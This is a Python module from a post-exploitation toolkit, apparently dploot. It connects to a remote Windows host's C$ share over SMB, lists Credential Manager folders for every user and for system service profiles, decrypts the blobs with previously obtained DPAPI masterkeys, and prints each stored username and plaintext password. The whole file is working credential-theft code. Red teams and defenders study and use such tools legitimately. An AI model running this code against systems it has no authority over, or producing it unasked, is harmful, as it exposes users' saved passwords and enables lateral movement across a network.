import logging
import ntpath
from typing import Any, List
from dataclasses import dataclass

from impacket.dpapi import CREDENTIAL_BLOB

from dploot.lib.dpapi import decrypt_credential, find_masterkey_for_credential_blob
from dploot.lib.smb import DPLootSMBConnection
from dploot.lib.target import Target
from dploot.lib.utils import is_credfile
from dploot.triage.masterkeys import Masterkey


@dataclass
class Credential:
    winuser: str
    credblob: "CREDENTIAL_BLOB | Any"
    target: str
    description: str
    unknown: str
    username: str
    password: str

    def dump(self) -> None:
        self.credblob.dump()

    def dump_quiet(self) -> None:
        print(f"[CREDENTIAL] {self.target} - {self.username}:{self.password}")


class CredentialsTriage:
    false_positive = [
        ".",
        "..",
        "desktop.ini",
        "Public",
        "Default",
        "Default User",
        "All Users",
    ]
    user_credentials_generic_path = [
        "Users\\%s\\AppData\\Local\\Microsoft\\Credentials",
        "Users\\%s\\AppData\\Roaming\\Microsoft\\Credentials",
    ]

    system_credentials_generic_path = [
        "Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials",
        "Windows\\System32\\config\\systemprofile\\AppData\\Roaming\\Microsoft\\Credentials",
        "Windows\\ServiceProfiles\\LocalService\\AppData\\Local\\Microsoft\\Credentials",
        "Windows\\ServiceProfiles\\LocalService\\AppData\\Roaming\\Microsoft\\Credentials",
        "Windows\\ServiceProfiles\\NetworkService\\AppData\\Local\\Microsoft\\Credentials",
        "Windows\\ServiceProfiles\\NetworkService\\AppData\\Roaming\\Microsoft\\Credentials",
    ]
    share = "C$"

    def __init__(
        self,
        target: Target,
        conn: DPLootSMBConnection,
        masterkeys: List[Masterkey],
        per_credential_callback: Any = None,
    ) -> None:
        self.target = target
        self.conn = conn

        self._users = None
        self.looted_files = {}
        self.masterkeys = masterkeys

        self.per_credential_callback = per_credential_callback

    def triage_system_credentials(self) -> List[Credential]:
        credentials = []
        credential_dirs = self.conn.listDirs(
            self.share, self.system_credentials_generic_path
        )
        for system_credential_path, system_credential_dir in credential_dirs.items():
            if system_credential_dir is not None:
                credentials += self.triage_credentials_folder(
                    credential_folder_path=system_credential_path,
                    credential_folder=system_credential_dir,
                    winuser="SYSTEM",
                )
        return credentials

    def triage_credentials(self) -> List[Credential]:
        credentials = []
        for user in self.users:
            try:
                credentials += self.triage_credentials_for_user(user)
            except Exception as e:
                if logging.getLogger().level == logging.DEBUG:
                    import traceback

                    traceback.print_exc()
                    logging.debug(str(e))
        return credentials

    def triage_credentials_for_user(self, user: str) -> List[Credential]:
        credentials = []
        credential_dirs = self.conn.listDirs(
            self.share, [elem % user for elem in self.user_credentials_generic_path]
        )
        for user_credential_path, user_credential_dir in credential_dirs.items():
            if user_credential_dir is not None:
                credentials += self.triage_credentials_folder(
                    credential_folder_path=user_credential_path,
                    credential_folder=user_credential_dir,
                    winuser=user,
                )
        return credentials

    def triage_credentials_folder(
        self, credential_folder_path, credential_folder, winuser: str
    ) -> List[Credential]:
        credentials = []
        for d in credential_folder:
            if is_credfile(d.get_longname()):
                cred_filename = d.get_longname()
                cred_filename_path = ntpath.join(credential_folder_path, cred_filename)
                logging.debug(
                    f"Found Credential Manager blob: \\\\{self.target.address}\\{self.share}\\{cred_filename_path}"
                )
                # read credman blob
                credmanblob_bytes = self.conn.readFile(self.share, cred_filename_path, looted_files=self.looted_files)
                if credmanblob_bytes is not None and self.masterkeys is not None:
                    masterkey = find_masterkey_for_credential_blob(
                        credmanblob_bytes, self.masterkeys
                    )
                    if masterkey is not None:
                        cred = decrypt_credential(credmanblob_bytes, masterkey)
                        credential = None
                        if cred["Unknown3"] != b"":
                            try:
                                credential = Credential(
                                    winuser=winuser,
                                    credblob=cred,
                                    target=cred["Target"].decode("utf-16le"),
                                    description=cred["Description"].decode("utf-16le"),
                                    unknown=cred["Unknown"].decode("utf-16le"),
                                    username=cred["Username"].decode("utf-16le"),
                                    password=cred["Unknown3"].decode("utf-16le"),
                                )
                            except UnicodeDecodeError:
                                credential = Credential(
                                    winuser=winuser,
                                    credblob=cred,
                                    target=cred["Target"].decode("utf-16le"),
                                    description=cred["Description"].decode("utf-16le"),
                                    unknown=cred["Unknown"].decode("utf-16le"),
                                    username=cred["Username"].decode("utf-16le"),
                                    password=cred["Unknown3"].decode("latin-1"),
                                )
                            credentials.append(credential)
                            if self.per_credential_callback is not None:
                                self.per_credential_callback(credential)
                    else:
                        logging.debug("Could not decrypt...")
        return credentials

    @property
    def users(self) -> List[str]:
        if self._users is not None:
            return self._users

        self._users = self.conn.list_users(self.share)

        return self._users
